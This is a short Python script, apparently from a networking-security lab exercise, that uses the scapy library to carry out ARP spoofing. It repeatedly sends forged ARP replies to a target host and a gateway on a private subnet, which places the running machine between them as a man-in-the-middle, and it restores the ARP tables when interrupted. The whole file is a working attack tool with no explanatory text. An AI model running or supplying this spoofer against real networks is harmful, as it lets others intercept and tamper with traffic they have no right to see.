#! /usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)


def restore(dedt_ip, src_ip):
    arp_packet = scapy.ARP(op=2, pdst=dedt_ip, hwdst=get_mac(dedt_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    print(arp_packet.summary())
    scapy.send(arp_packet, count=4, verbose=False)


packet_count = 0

target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count = packet_count + 2
        print("\r[+] packets send : " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("CRTL C entered.....Quitting ")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP tables restored")
